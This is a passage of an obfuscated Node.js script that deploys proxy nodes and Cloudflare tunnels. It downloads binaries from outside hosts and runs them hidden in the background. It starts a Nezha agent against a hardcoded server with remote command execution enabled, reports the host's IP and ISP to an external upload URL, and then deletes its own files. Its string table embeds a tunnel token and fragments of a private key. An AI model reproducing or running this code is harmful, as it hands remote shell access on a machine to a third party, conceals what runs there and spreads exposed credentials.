      const _0x2f9968 = _0x2df6cf(_0x55f9cb._0x172575) + phpPath + _0x2df6cf(0x11a) + FILE_PATH + _0x2df6cf(_0x55f9cb._0xb3edb9)
      try {
        ;(await exec(_0x2f9968),
          console[_0x2df6cf(_0x55f9cb._0x135654)](phpName + _0x2df6cf(0xd0)),
          await new Promise((_0x3f3930) => setTimeout(_0x3f3930, 0x3e8)))
      } catch (_0x33fc29) {
        console[_0x2df6cf(_0x55f9cb._0x31bf4e)](_0x2df6cf(_0x55f9cb._0xcbe9dc) + _0x33fc29)
      }
    } else {
      let _0x1f3c93 = ''
      const _0x1b5d02 = [_0x2df6cf(0xc8), '8443', _0x2df6cf(0xdb), '2087', '2083', _0x2df6cf(0x14e)]
      _0x1b5d02[_0x2df6cf(_0x55f9cb._0x492424)](NEZHA_PORT) && (_0x1f3c93 = _0x2df6cf(_0x55f9cb._0x324085))
      const _0x18a8af =
        'nohup\x20' +
        npmPath +
        '\x20-s\x20' +
        NEZHA_SERVER +
        ':' +
        NEZHA_PORT +
        _0x2df6cf(_0x55f9cb._0xf29ff6) +
        NEZHA_KEY +
        '\x20' +
        _0x1f3c93 +
        _0x2df6cf(0x17c)
      try {
        ;(await exec(_0x18a8af),
          console[_0x2df6cf(0xc5)](npmName + _0x2df6cf(_0x55f9cb._0x4e2e8e)),
          await new Promise((_0x339e5f) => setTimeout(_0x339e5f, 0x3e8)))
      } catch (_0x2e02fe) {
        console[_0x2df6cf(_0x55f9cb._0x31bf4e)]('npm\x20running\x20error:\x20' + _0x2e02fe)
      }
    }
  } else console[_0x2df6cf(0xc5)]('NEZHA\x20variable\x20is\x20empty,skip\x20running')
  const _0x47ca06 = _0x2df6cf(0xec) + webPath + _0x2df6cf(0x188) + FILE_PATH + _0x2df6cf(0x171)
  try {
    ;(await exec(_0x47ca06),
      console[_0x2df6cf(_0x55f9cb._0x3b134d)](webName + _0x2df6cf(_0x55f9cb._0x4e2e8e)),
      await new Promise((_0x4a102b) => setTimeout(_0x4a102b, 0x3e8)))
  } catch (_0x35cd17) {
    console[_0x2df6cf(0x140)](_0x2df6cf(0xc7) + _0x35cd17)
  }
  if (fs[_0x2df6cf(0xb9)](botPath)) {
    let _0x413d28
    if (ARGO_AUTH[_0x2df6cf(_0x55f9cb._0x46d593)](/^[A-Z0-9a-z=]{120,250}$/))
      _0x413d28 = 'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20' + ARGO_AUTH
    else
      ARGO_AUTH[_0x2df6cf(_0x55f9cb._0x46d593)](/TunnelSecret/)
        ? (_0x413d28 = _0x2df6cf(0x144) + path[_0x2df6cf(_0x55f9cb._0x126e83)](FILE_PATH, 'tunnel.yml') + _0x2df6cf(0x99))
        : (_0x413d28 =
            'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22' +
            path[_0x2df6cf(_0x55f9cb._0x126e83)](bootLogPath) +
            _0x2df6cf(_0x55f9cb._0x3665db) +
            ARGO_PORT)
    try {
      ;(await exec(
        _0x2df6cf(_0x55f9cb._0x197553) + path[_0x2df6cf(_0x55f9cb._0x126e83)](botPath) + '\x22\x20' + _0x413d28 + _0x2df6cf(_0x55f9cb._0x20ceb7)
      ),
        console[_0x2df6cf(_0x55f9cb._0x42fb83)](botName + '\x20is\x20running'),
        await new Promise((_0x2698f4) => setTimeout(_0x2698f4, 0x7d0)))
    } catch (_0x3cb0da) {
      console[_0x2df6cf(0x140)](_0x2df6cf(0xa6) + _0x3cb0da)
    }
  }
  await new Promise((_0x289381) => setTimeout(_0x289381, 0x1388))
}
function getFilesForArchitecture(_0x17a940) {
  const _0x398908 = { _0x48c78e: 0xfe, _0x48a5a2: 0x149, _0x3c0aff: 0xdc, _0x43f75d: 0x139, _0x4a5021: 0x16c, _0x5e40ad: 0x135, _0x35469f: 0x112 },
    _0x227af5 = _0x1b63d3,
    _0x9a6837 = _0x17a940 === _0x227af5(0x149) ? _0x227af5(_0x398908._0x48c78e) : _0x227af5(0xd8),
    _0x37c4e6 = _0x17a940 === _0x227af5(_0x398908._0x48a5a2) ? _0x227af5(0x145) : _0x227af5(_0x398908._0x3c0aff),
    _0x4e47a5 = [
      { fileName: webPath, fileUrls: [_0x9a6837 + _0x227af5(0x139), _0x37c4e6 + _0x227af5(_0x398908._0x43f75d)] },
      { fileName: botPath, fileUrls: [_0x9a6837 + _0x227af5(0x16c), _0x37c4e6 + _0x227af5(_0x398908._0x4a5021)] }
    ]
  return (
    NEZHA_SERVER &&
      NEZHA_KEY &&
      (NEZHA_PORT
        ? _0x4e47a5['unshift']({ fileName: npmPath, fileUrls: [_0x9a6837 + _0x227af5(_0x398908._0x5e40ad), _0x37c4e6 + '/agent'] })
        : _0x4e47a5[_0x227af5(_0x398908._0x35469f)]({ fileName: phpPath, fileUrls: [_0x9a6837 + _0x227af5(0x13e), _0x37c4e6 + _0x227af5(0x13e)] })),
    _0x4e47a5
  )
}
function argoType() {
  const _0x15b240 = {
      _0x51017a: 0xb4,
      _0x432ed4: 0x12a,
      _0x3dbf2e: 0x15e,
      _0x17ba89: 0x198,
      _0xd8d2c: 0xba,
      _0x7c6927: 0x166,
      _0x57ecb1: 0x121,
      _0x147578: 0xc5,
      _0xc01f6d: 0x150
    },
    _0x238d04 = _0x1b63d3
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console[_0x238d04(0xc5)](_0x238d04(_0x15b240._0x51017a))
    return
  }
  if (ARGO_AUTH[_0x238d04(_0x15b240._0x432ed4)](_0x238d04(_0x15b240._0x3dbf2e))) {
    fs['writeFileSync'](path[_0x238d04(_0x15b240._0x17ba89)](FILE_PATH, _0x238d04(_0x15b240._0xd8d2c)), ARGO_AUTH)
    const _0x50dfb0 =
      '\x0a\x20\x20tunnel:\x20' +
      ARGO_AUTH[_0x238d04(_0x15b240._0x7c6927)]('\x22')[0xb] +
      '\x0a\x20\x20credentials-file:\x20' +
      path[_0x238d04(0x198)](FILE_PATH, _0x238d04(0xba)) +
      _0x238d04(0xe9) +
      ARGO_DOMAIN +
      _0x238d04(0xaf) +
      ARGO_PORT +
      _0x238d04(_0x15b240._0x57ecb1)
    fs['writeFileSync'](path[_0x238d04(0x198)](FILE_PATH, _0x238d04(0xb3)), _0x50dfb0)
  } else console[_0x238d04(_0x15b240._0x147578)](_0x238d04(_0x15b240._0xc01f6d) + ARGO_PORT + _0x238d04(0x15d))
}
async function waitForQuickTunnelLog(_0x48e6eb = 0x7530) {
  const _0x457aa6 = { _0x58393d: 0xb9, _0x3dd1b9: 0x195, _0x4d9931: 0x1b1 },
    _0x1d6d35 = _0x1b63d3,
    _0x27cff9 = Date['now']() + _0x48e6eb
  while (Date[_0x1d6d35(0xe0)]() < _0x27cff9) {
    try {
      if (fs[_0x1d6d35(_0x457aa6._0x58393d)](bootLogPath)) {
        const _0x4132e7 = fs[_0x1d6d35(_0x457aa6._0x3dd1b9)](bootLogPath, _0x1d6d35(0x12c))
        if (/trycloudflare\.com/[_0x1d6d35(_0x457aa6._0x4d9931)](_0x4132e7)) return _0x4132e7
      }
    } catch (_0x19ea7f) {}
    await new Promise((_0x4cba17) => setTimeout(_0x4cba17, 0x3e8))
  }
  return ''
}
async function extractDomains() {
  const _0x48f15e = {
      _0x38fc92: 0x166,
      _0x2c3e29: 0xc5,
      _0x38f1f4: 0x11b,
      _0xeb4cfe: 0x185,
      _0x5d07e3: 0xee,
      _0x4a5ce3: 0xcb,
      _0xdbdc64: 0x164,
      _0x52e759: 0xa6
    },
    _0x246a31 = { _0x1e24ff: 0x129, _0xfeb5f3: 0x154 },
    _0x12d04d = { _0x1128e8: 0x1a8, _0x47bcdc: 0x168 },
    _0x11a349 = _0x1b63d3
  let _0x22ebe3
  if (ARGO_AUTH && ARGO_DOMAIN) ((_0x22ebe3 = ARGO_DOMAIN), console[_0x11a349(0xc5)]('ARGO_DOMAIN:', _0x22ebe3), await generateLinks(_0x22ebe3))
  else
    try {
      const _0x195991 = await waitForQuickTunnelLog(),
        _0x47ba76 = _0x195991[_0x11a349(_0x48f15e._0x38fc92)]('\x0a'),
        _0x309e86 = []
      _0x47ba76['forEach']((_0x539aa8) => {
        const _0xa847fc = _0x11a349,
          _0x2f635a = _0x539aa8[_0xa847fc(_0x12d04d._0x1128e8)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
        if (_0x2f635a) {
          const _0x11efa2 = _0x2f635a[0x1]
          _0x309e86[_0xa847fc(_0x12d04d._0x47bcdc)](_0x11efa2)
        }
      })
      if (_0x309e86['length'] > 0x0)
        ((_0x22ebe3 = _0x309e86[0x0]), console[_0x11a349(0xc5)](_0x11a349(0xb1), _0x22ebe3), await generateLinks(_0x22ebe3))
      else {
        ;(console[_0x11a349(_0x48f15e._0x2c3e29)](_0x11a349(_0x48f15e._0x38f1f4)),
          fs[_0x11a349(_0x48f15e._0xeb4cfe)](path['join'](FILE_PATH, 'boot.log')))
        async function _0x5eabaa() {
          const _0xd1f641 = _0x11a349
          try {
            process[_0xd1f641(0xb7)] === _0xd1f641(0x19f)
              ? await exec('taskkill\x20/f\x20/im\x20' + botName + '.exe\x20>\x20nul\x202>&1')
              : await exec(
                  _0xd1f641(_0x246a31._0x1e24ff) +
                    botName[_0xd1f641(0x12b)](0x0) +
                    ']' +
                    botName[_0xd1f641(0x106)](0x1) +
                    _0xd1f641(_0x246a31._0xfeb5f3)
                )
          } catch (_0x4aa795) {}
        }
        ;(_0x5eabaa(), await new Promise((_0xdfc7ff) => setTimeout(_0xdfc7ff, 0xbb8)))
        const _0x473735 = _0x11a349(_0x48f15e._0x5d07e3) + path[_0x11a349(0x10a)](bootLogPath) + _0x11a349(_0x48f15e._0x4a5ce3) + ARGO_PORT
        try {
          ;(await exec(_0x11a349(_0x48f15e._0xdbdc64) + path['resolve'](botPath) + '\x22\x20' + _0x473735 + '\x20>/dev/null\x202>&1\x20&'),
            console['log'](botName + _0x11a349(0xd0)),
            await new Promise((_0x1f74f0) => setTimeout(_0x1f74f0, 0x1770)),
            await extractDomains())
        } catch (_0x1aa5da) {
          console['error'](_0x11a349(_0x48f15e._0x52e759) + _0x1aa5da)
        }
      }
    } catch (_0x99f457) {
      console['error'](_0x11a349(0x101), _0x99f457)
    }
}
async function getMetaInfo() {
  const _0x4ae640 = {
      _0x1ac68a: 0xaa,
      _0x3a93c9: 0x1b2,
      _0x97ae3a: 0x163,
      _0x284af7: 0x158,
      _0x28a75f: 0x170,
      _0x36255e: 0x175,
      _0x5f547a: 0xc2,
      _0x264e74: 0xd3,
      _0x3c7b36: 0x158,
      _0x49b951: 0x17a,
      _0x368477: 0x143
    },
    _0x26227f = _0x1b63d3
  try {
    const _0x115376 = await axios[_0x26227f(_0x4ae640._0x1ac68a)](_0x26227f(_0x4ae640._0x3a93c9), {
      headers: { 'User-Agent': _0x26227f(_0x4ae640._0x97ae3a), timeout: 0xbb8 }
    })
    if (
      _0x115376[_0x26227f(_0x4ae640._0x284af7)] &&
      _0x115376[_0x26227f(_0x4ae640._0x284af7)][_0x26227f(0x170)] &&
      _0x115376[_0x26227f(0x158)]['isp']
    )
      return (_0x115376[_0x26227f(_0x4ae640._0x284af7)][_0x26227f(_0x4ae640._0x28a75f)] + '-' + _0x115376['data'][_0x26227f(_0x4ae640._0x36255e)])[
        'replace'
      ](/\s+/g, '_')
  } catch (_0x5455b2) {
    try {
      const _0x1b0ca9 = await axios[_0x26227f(_0x4ae640._0x1ac68a)](_0x26227f(_0x4ae640._0x5f547a), {
        headers: { 'User-Agent': _0x26227f(0x163), timeout: 0xbb8 }
      })
      if (
        _0x1b0ca9[_0x26227f(_0x4ae640._0x284af7)] &&
        _0x1b0ca9['data'][_0x26227f(0xa0)] === _0x26227f(0x136) &&
        _0x1b0ca9[_0x26227f(0x158)][_0x26227f(_0x4ae640._0x264e74)] &&
        _0x1b0ca9[_0x26227f(_0x4ae640._0x3c7b36)]['org']
      )
        return (_0x1b0ca9['data'][_0x26227f(0xd3)] + '-' + _0x1b0ca9[_0x26227f(0x158)][_0x26227f(_0x4ae640._0x49b951)])[_0x26227f(0x193)](/\s+/g, '_')
    } catch (_0x33d985) {}
  }
  return _0x26227f(_0x4ae640._0x368477)
}
async function getServerIP() {
  const _0x162707 = { _0x43b757: 0xaa, _0x4a88be: 0x9a, _0x214519: 0xbb, _0x302da5: 0xaa, _0x1b0596: 0x158, _0x4ea39c: 0x10b },
    _0x5790d4 = _0x1b63d3
  let _0x4034df = ''
  try {
    const _0x285f5a = await axios[_0x5790d4(_0x162707._0x43b757)](_0x5790d4(_0x162707._0x4a88be), { timeout: 0xbb8 })
    _0x4034df = _0x285f5a['data']['trim']()
  } catch (_0x4bd847) {
    try {
      _0x4034df = execSync(_0x5790d4(_0x162707._0x214519))[_0x5790d4(0x10b)]()[_0x5790d4(0x152)]()
    } catch (_0x51ad3e) {
      try {
        const _0x4f9f6f = await axios[_0x5790d4(_0x162707._0x302da5)](_0x5790d4(0x146), { timeout: 0xbb8 })
        _0x4034df = '[' + _0x4f9f6f[_0x5790d4(_0x162707._0x1b0596)][_0x5790d4(0x152)]() + ']'
      } catch (_0xea308b) {
        try {
          _0x4034df = '[' + execSync(_0x5790d4(0x107))[_0x5790d4(_0x162707._0x4ea39c)]()[_0x5790d4(0x152)]() + ']'
        } catch (_0x5a9d1f) {
          console['error']('Failed\x20to\x20get\x20IP\x20address:', _0x5a9d1f[_0x5790d4(0x98)])
        }
      }
    }
  }
  return _0x4034df
}
function _0x2bd6() {
  const _0x1cf1ee = [
    'tcp',
    'mkdirSync',
    'vmess-ws-in',
    '&fp=firefox&type=ws&host=',
    '\x0aclient_secret:\x20',
    'block',
    'from',
    'SHOW_LOG',
    'unlinkSync',
    '7575949494',
    'Failed\x20to\x20calculate\x20certificate\x20fingerprint:',
    '\x20-c\x20',
    'base64',
    'CFPORT',
    'PORT',
    'map',
    'readdirSync',
    '--tls',
    '5789072zqJjmh',
    'aarch64',
    'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',
    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
    'replace',
    '66ObGFyWnpwsEsGhy5y2jcBf21YSltY8',
    'readFileSync',
    's5-in',
    '236NwbVml',
    'join',
    '\x20>/dev/null\x202>&1\x20&',
    '```',
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiMWYzMGY3NTAtMzIyYS00ZWFhLTlkNzEtMjJjZWRhMWZlZjg0IiwicyI6Ik5EY3lOV1ZrTlRRdE1tVm1NaTAwWTJJNExUaGpNV1F0Tm1OaVlXWTJNR0V5TUdVdyJ9',
    'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a',
    'catch',
    '\x0aPublicKey:\x20',
    'win32',
    'http',
    'hex',
    'abcdefghijklmnopqrstuvwxyz',
    '\x22\x20-out\x20\x22',
    'stringify',
    'arch',
    'end',
    '/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none',
    'match',
    'utf8',
    'promises',
    '/trojan-argo',
    'Skipping\x20adding\x20automatic\x20access\x20task',
    'privateKey',
    '/config.yaml\x22\x20>/dev/null\x202>&1\x20&',
    '773066mVQCAW',
    'clear',
    'test',
    'https://api.ip.sb/geoip',
    'blackhole',
    'sha256',
    '/dev/null',
    'createServer',
    'message',
    '\x22\x20run',
    'http://ipv4.ip.sb',
    'vless-in',
    'all',
    'child_process',
    'Retrying\x20',
    '\x0avless://',
    'status',
    'true',
    'forEach',
    '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20',
    '?encryption=none&security=tls&sni=',
    '\x20-p\x20',
    'Error\x20executing\x20command:\x20',
    '\x0a\x0atrojan://',
    '/vmess-argo',
    'xtls-rprx-vision',
    'get',
    '\x20from\x20backup\x20source',
    'http\x20server\x20is\x20running\x20on\x20',
    'Subscription\x20content\x20not\x20yet\x20available,\x20please\x20try\x20again\x20later.',
    'util',
    '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:',
    '\x20>\x20nul\x202>&1',
    'ArgoDomain:',
    'length',
    'tunnel.yml',
    'ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20is\x20empty,\x20use\x20quick\x20tunnels',
    'S5_PORT',
    'slice',
    'platform',
    '3500791HjDzin',
    'existsSync',
    'tunnel.json',
    'curl\x20-sm\x203\x20ipv4.ip.sb',
    '2083',
    'NEZHA_KEY',
    '-----END\x20EC\x20PRIVATE\x20KEY-----\x0a',
    'SUB_PATH',
    'password',
    'text/html;\x20charset=utf-8',
    'http://ip-api.com/json',
    'path',
    'finish',
    'log',
    'random',
    'web\x20running\x20error:\x20',
    '443',
    '.npm',
    'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a',
    '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:',
    'js-node',
    'pop',
    'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a',
    'www.iij.ad.jp',
    '\x20is\x20running',
    'Nodes\x20uploaded\x20successfully',
    '\x0a\x20\x20\x20\x20',
    'countryCode',
    'trojan',
    'stream',
    'none',
    'text/plain;\x20charset=utf-8',
    'https://amd64.oooen.com',
    'close',
    'Telegram\x20message\x20sent\x20successfully',
    '2096',
    'https://amd64.ssss.nyc.mn',
    'FILE_PATH',
    'CHAT_ID',
    'Unhandled\x20error\x20in\x20startserver:',
    'now',
    'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a',
    'dirname',
    'NAME',
    'boot.log',
    'digest',
    'createWriteStream',
    'createHash',
    '849741wAwhiK',
    '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20',
    '-----BEGIN\x20EC\x20PARAMETERS-----\x0a',
    'CFIP',
    'nohup\x20',
    'vless-ws-in',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22',
    'mfa.gov.ua',
    'tls',
    'NEZHA_PORT',
    'ARGO_DOMAIN',
    'writeFileSync',
    'unlink',
    'quic',
    '182713kBzgIO',
    'Public\x20Key:',
    '\x5c$&',
    '800',
    'www.iij.ad.jp:443',
    'Download\x20',
    'Private\x20Key:',
    '&path=%2Ftrojan-argo%3Fed%3D2560#',
    'https://arm64.oooen.com',
    'Failed\x20to\x20send\x20Telegram\x20message:',
    'false',
    'Error\x20reading\x20boot.log:',
    'list.txt',
    'vmess',
    'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a',
    'firefox',
    'substring',
    'curl\x20-sm\x203\x20ipv6.ip.sb',
    'hysteria',
    'vless-tcp-in',
    'resolve',
    'toString',
    'HY2_PORT',
    '/sendMessage',
    'Error\x20in\x20startserver:',
    '?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=',
    'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a',
    '\x0a\x0avmess://',
    'unshift',
    '/api/delete-nodes',
    'basename',
    'Subscription\x20uploaded\x20successfully',
    'url',
    'renameSync',
    'writeHead',
    'vless',
    '\x20-c\x20\x22',
    'ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain',
    '41185HKRnnw',
    'post',
    'NEZHA_SERVER',
    'index.html',
    'Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!',
    '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20',
    'sub.txt',
    'vless-fallback-in',
    '/vless-argo',
    'trojan-ws-in',
    '?security=tls&sni=',
    'toUpperCase',
    'toLowerCase',
    'pkill\x20-f\x20\x22[',
    'includes',
    'charAt',
    'utf-8',
    'openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22',
    '\x20failed:\x20',
    'UPLOAD_URL',
    'export',
    'UUID',
    'auto',
    '\x20successfully',
    'filter',
    '/agent',
    'success',
    'subarray',
    'env',
    '/web',
    'App\x20is\x20running',
    'raw',
    'der',
    '2087',
    '/v1',
    'string',
    'error',
    'php\x20running\x20error:\x20',
    'arm64',
    'Unknown',
    'tunnel\x20--edge-ip-version\x20auto\x20--config\x20\x22',
    'https://arm64.ssss.nyc.mn',
    'http://ipv6.ip.sb',
    'openssl\x20x509\x20-noout\x20-fingerprint\x20-sha256\x20-in\x20\x22',
    'fileName',
    'arm',
    'amd',
    '\x20>/dev/null\x202>&1',
    'ignore',
    'base64url',
    '2053',
    '127.0.0.1',
    'Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20',
    '91896wfMpjG',
    'trim',
    '&pinSHA256=',
    '\x22\x20>\x20/dev/null\x202>&1',
    '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',
    '\x0ahysteria2://',
    'inbounds',
    'data',
    '-----END\x20EC\x20PARAMETERS-----\x0a',
    'isFile',
    '\x22\x20-subj\x20\x22/CN=bing.com\x22',
    '-----BEGIN\x20CERTIFICATE-----\x0a',
    '\x20in\x20clouudflare',
    'TunnelSecret',
    'wasmer.933993.xyz',
    '/api/add-subscriptions',
    '8443',
    'Add\x20automatic\x20access\x20task\x20faild:\x20',
    'Mozilla/5.0',
    'nohup\x20\x22',
    'update',
    'split',
    'openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22',
    'push',
    'nezha.933993.xyz:443',
    'key.txt',
    'hysteria-in',
    '/bot',
    'readFile',
    'x25519',
    'direct',
    'country_code',
    '/config.json\x20>/dev/null\x202>&1\x20&',
    'application/json',
    'pipe',
    'config.json',
    'isp',
    'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a',
    'del\x20/f\x20/q\x20',
    'https://bing.com',
    'rm\x20-rf\x20',
    'org',
    'ARGO_AUTH',
    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&'
  ]
  _0x2bd6 = function () {
    return _0x1cf1ee
  }
  return _0x2bd6()
}
async function generateLinks(_0x49c642) {
  const _0x3bc60c = {
      _0x1b0182: 0x132,
      _0xcb839: 0x180,
      _0x45af56: 0x10b,
      _0x1f9a33: 0x180,
      _0x254c38: 0xfd,
      _0xfca7af: 0x1a7,
      _0x1413b3: 0x9f,
      _0x3bc81c: 0x10f,
      _0x3c6818: 0x189,
      _0x21fd4a: 0xc5,
      _0x31da78: 0x10b,
      _0x131fcd: 0x1a9
    },
    _0x20144d = await getMetaInfo(),
    _0x40e3dc = NAME ? NAME + '-' + _0x20144d : _0x20144d,
    _0x35556f = await getServerIP()
  return new Promise((_0x90c589) => {
    setTimeout(() => {
      const _0x447696 = _0x182c,
        _0x400df4 = {
          v: '2',
          ps: '' + _0x40e3dc,
          add: CFIP,
          port: CFPORT,
          id: UUID,
          aid: '0',
          scy: _0x447696(_0x3bc60c._0x1b0182),
          net: 'ws',
          type: 'none',
          host: _0x49c642,
          path: '/vmess-argo?ed=2560',
          tls: 'tls',
          sni: _0x49c642,
          alpn: '',
          fp: _0x447696(0x105)
        }
      let _0x590945 =
        '\x0avless://' +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x447696(0xa4) +
        _0x49c642 +
        _0x447696(_0x3bc60c._0xcb839) +
        _0x49c642 +
        '&path=%2Fvless-argo%3Fed%3D2560#' +
        _0x40e3dc +
        _0x447696(0x111) +
        Buffer['from'](JSON['stringify'](_0x400df4))[_0x447696(_0x3bc60c._0x45af56)]('base64') +
        _0x447696(0xa7) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x447696(0x126) +
        _0x49c642 +
        _0x447696(_0x3bc60c._0x1f9a33) +
        _0x49c642 +
        _0x447696(_0x3bc60c._0x254c38) +
        _0x40e3dc +
        _0x447696(0xd2)
      if (isValidPort(HY2_PORT)) {
        const _0x5627f3 = getCertificateFingerprint(certPath),
          _0x3f1178 = _0x5627f3 ? _0x447696(0x153) + encodeURIComponent(_0x5627f3) : '',
          _0x36697e = _0x447696(0x156) + UUID + '@' + _0x35556f + ':' + HY2_PORT + _0x447696(_0x3bc60c._0xfca7af) + _0x3f1178 + '#' + _0x40e3dc
        _0x590945 += _0x36697e
      }
      if (isValidPort(REALITY_PORT)) {
        const _0x2da12f =
          _0x447696(_0x3bc60c._0x1413b3) +
          UUID +
          '@' +
          _0x35556f +
          ':' +
          REALITY_PORT +
          _0x447696(_0x3bc60c._0x3bc81c) +
          publicKey +
          '&type=tcp&headerType=none#' +
          _0x40e3dc
        _0x590945 += _0x2da12f
      }
      if (isValidPort(S5_PORT)) {
        const _0x192e81 = Buffer[_0x447696(0x183)](UUID[_0x447696(0x106)](0x0, 0x8) + ':' + UUID['slice'](-0xc))[_0x447696(_0x3bc60c._0x45af56)](
            _0x447696(_0x3bc60c._0x3c6818)
          ),
          _0x17fd1b = '\x0asocks://' + _0x192e81 + '@' + _0x35556f + ':' + S5_PORT + '#' + _0x40e3dc
        _0x590945 += _0x17fd1b
      }
      ;(console[_0x447696(_0x3bc60c._0x21fd4a)](Buffer[_0x447696(0x183)](_0x590945)[_0x447696(_0x3bc60c._0x31da78)](_0x447696(0x189))),
        fs['writeFileSync'](subPath, Buffer[_0x447696(0x183)](_0x590945)['toString'](_0x447696(_0x3bc60c._0x3c6818))),
        fs['writeFileSync'](listPath, _0x590945, _0x447696(_0x3bc60c._0x131fcd)),
        console[_0x447696(_0x3bc60c._0x21fd4a)](FILE_PATH + '/sub.txt\x20saved\x20successfully'),
        (subContent = Buffer[_0x447696(0x183)](_0x590945)[_0x447696(_0x3bc60c._0x45af56)]('base64')),
        uploadNodes(),
        _0x90c589(_0x590945))
    }, 0x7d0)
  })
}
async function uploadNodes() {
  const _0x2ce355 = {
      _0x2eea53: 0x160,
      _0x42fbea: 0x115,
      _0x3727c3: 0xa0,
      _0x5d7a31: 0x195,
      _0x4847af: 0x134,
      _0x7927ca: 0x1a4,
      _0x12a1be: 0xc5,
      _0x395222: 0xd1
    },
    _0x38d182 = _0x1b63d3
  if (UPLOAD_URL && PROJECT_URL) {
    const _0x245a31 = PROJECT_URL + '/' + SUB_PATH,
      _0x37aa9f = { subscription: [_0x245a31] }
    try {
      const _0x48cd7d = await axios['post'](UPLOAD_URL + _0x38d182(_0x2ce355._0x2eea53), _0x37aa9f, { headers: { 'Content-Type': _0x38d182(0x172) } })
      return _0x48cd7d && _0x48cd7d['status'] === 0xc8 ? (console['log'](_0x38d182(_0x2ce355._0x42fbea)), _0x48cd7d) : null
    } catch (_0x1ee040) {
      if (_0x1ee040['response']) {
        if (_0x1ee040['response'][_0x38d182(_0x2ce355._0x3727c3)] === 0x190) {
        }
      }
    }
  } else {
    if (UPLOAD_URL) {
      if (!fs[_0x38d182(0xb9)](listPath)) return
      const _0x58a2e7 = fs[_0x38d182(_0x2ce355._0x5d7a31)](listPath, _0x38d182(0x12c)),
        _0x5f5dcc = _0x58a2e7[_0x38d182(0x166)]('\x0a')[_0x38d182(_0x2ce355._0x4847af)]((_0x192895) =>
          /(vless|vmess|trojan|hysteria2|socks):\/\//['test'](_0x192895)
        )
      if (_0x5f5dcc['length'] === 0x0) return
      const _0x4b4a99 = JSON[_0x38d182(_0x2ce355._0x7927ca)]({ nodes: _0x5f5dcc })
      try {
        const _0x4394f5 = await axios['post'](UPLOAD_URL + '/api/add-nodes', _0x4b4a99, { headers: { 'Content-Type': _0x38d182(0x172) } })
        return _0x4394f5 && _0x4394f5['status'] === 0xc8 ? (console[_0x38d182(_0x2ce355._0x12a1be)](_0x38d182(_0x2ce355._0x395222)), _0x4394f5) : null
      } catch (_0x53fa9a) {
        return null
      }
    } else return
  }
}
function cleanFiles() {
  const _0x835fbf = { _0x40a620: 0x19f, _0x14da8c: 0x177, _0x2562a9: 0x179, _0x1525b3: 0x14b },
    _0x5411a7 = { _0x9ce3b2: 0x13a, _0x29ec2a: 0xc5, _0x34f4b0: 0x192 }
  setTimeout(() => {
    const _0x4d4a40 = { _0x4df93c: 0x1b0 },
      _0x422c93 = _0x182c,
      _0x4fb374 = [bootLogPath, configPath, webPath, botPath, listPath, certPath, keyPath]
    if (NEZHA_PORT) _0x4fb374['push'](npmPath)
    else NEZHA_SERVER && NEZHA_KEY && _0x4fb374[_0x422c93(0x168)](phpPath)
    process['platform'] === _0x422c93(_0x835fbf._0x40a620)
      ? exec(_0x422c93(_0x835fbf._0x14da8c) + _0x4fb374[_0x422c93(0x198)]('\x20') + _0x422c93(0xb0), (_0x46033a) => {
          const _0xdce54c = _0x422c93
          ;(console[_0xdce54c(_0x4d4a40._0x4df93c)](), alwaysLog('App\x20is\x20running'), console['log'](_0xdce54c(0x192)))
        })
